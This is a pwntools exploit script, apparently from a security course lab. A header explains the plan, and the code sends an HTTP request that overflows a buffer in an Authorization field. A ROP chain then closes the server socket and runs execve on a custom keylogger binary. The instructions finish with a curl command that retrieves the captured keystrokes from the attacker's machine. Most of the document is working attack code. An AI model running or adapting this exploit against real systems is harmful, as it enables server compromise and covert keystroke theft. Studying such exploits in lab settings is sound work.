'''
[Exploit Overview]
This exploit launches ./server_data with Return-Oriented Programming
We can rename the keylogger to a string already present in the binary, and retrieve the address of that string.

[Challenges & Decisions]
DEP stops code injection but not code-reuse, so we will use ROP.

The hardest part of this challenge lies in enabling the attacker to access the logged keyboard events after launching the keylogger:
    - Strategy 1: If we just launch the keylogger, the server dies, preventing the attacker to access the logged keyboard events. -> bad strategy
    - Strategy 2: If we launch the keylogger, we can revive the server by letting the keylogger execute the ./server_sc2. The problem is that socket 8080 is still connected to the keylogger process, so we can't.
    - Strategy 3: We can detach socket 8080 from the process: this can be done in the keylogger rustcode itself aswell, but we found enough gadgets to do it in the ROP chain
-> Strategy 3 is used.

a) The ROP chain consists of two steps:
    1. Detatching the socket from the current process
    2. Executing ./server_data with sys_execve

b) The keylogger revives the server. Now the attacker can access the logged keyboard events with a curl

[Execution Instructions]
1. cp the custom keylogger binary 'server_data' in the server_data folder
2. run the exploit
3. curl the logged keyboard events from the attacker's machine with curl http://{IP}:{PORT}/logged_keyboard_events.txt

[Vulnerability Discovery]
No additional bugs are required compared to scenario 1. We can re-use the bufferoverflow.

[Preventive Measures]
- ASLR makes ROP harder, but it does not prevent it if the attacker can get a leak.
'''

from pwn import *
import sys

if len(sys.argv) != 3:
    print("Usage: python script.py <target ip> <target port>")
    sys.exit(1)
    
context.encoding = "latin1"
exe = context.binary = ELF("./server_sc2")

TARGET = sys.argv[1]
TARGET_PORT = sys.argv[2]

log_buffer_rbp_offset = 0x450
log_buffer_prefix = 49

input("Copy the 'server_data' binary to 'server_data' directory. Input anything to continue.")

io = remote(TARGET, TARGET_PORT)

rop = ROP(exe)
g1 = p64(rop.find_gadget(['pop rdi', 'ret'])[0])
g2 = p64(rop.find_gadget(['pop rdx', 'pop rax', 'ret'])[0])
g3 = p64(rop.find_gadget(['pop rsi', 'pop r15', 'ret'])[0])
g4 = p64(rop.find_gadget(['syscall'])[0])

# Find the address of the string ./server_data
keylogger_adres = next(exe.search(b"./server_data"))

print("address van string './server_data':", hex(keylogger_adres))
print(f"address van ['pop rdi', 'ret'] = {hex(u64(g1))}")
print(f"address van ['pop rax', 'ret'] = {hex(u64(g2))}")
print(f"address van ['pop rsi', 'pop r15', 'ret'] = {hex(u64(g3))}")
print(f"address van ['syscall'] = {hex(u64(g4))}")

payload = [
    g1, p64(3),                # pop rdi (3), zet arg1 op 3 (server socket fd)
    g2, p64(0), p64(3),        # pop rdx; pop rax; ret, set rax to 3 (close)
    g4,                        # syscall, calls close(int fd), close(3)
    p64(0),                    # padding voor syscall routine, want geen ret na syscall
    g1, p64(keylogger_adres),  # pop rdi ("./server_data") zet rdi op address van "./server_data"
    g2, p64(0), p64(0x3b),     # clear rdx voor execve call en set rax op 0x3b (execve)
    g3, p64(0), p64(0),        # cleart rsi voor execve syscall
    g4                         # execve("./server_data", [], [])
]

request = b"GET /data HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nUser-Agent: curl/8.4.0\r\nAccept: */*\r\nContent-Type: text/plain\r\nContent-Length: 511\r\nAuthorization: Basic%s\r\n\r\n"
print("length request: " + str(len(request)))
padding_size = log_buffer_rbp_offset - log_buffer_prefix - (len(request) - 2) + 12
sc2_exploit = request.replace(b"%s", b"q" * padding_size + b"".join(payload))

### PERFORM ATTACK ###
io.send(sc2_exploit)
io.interactive()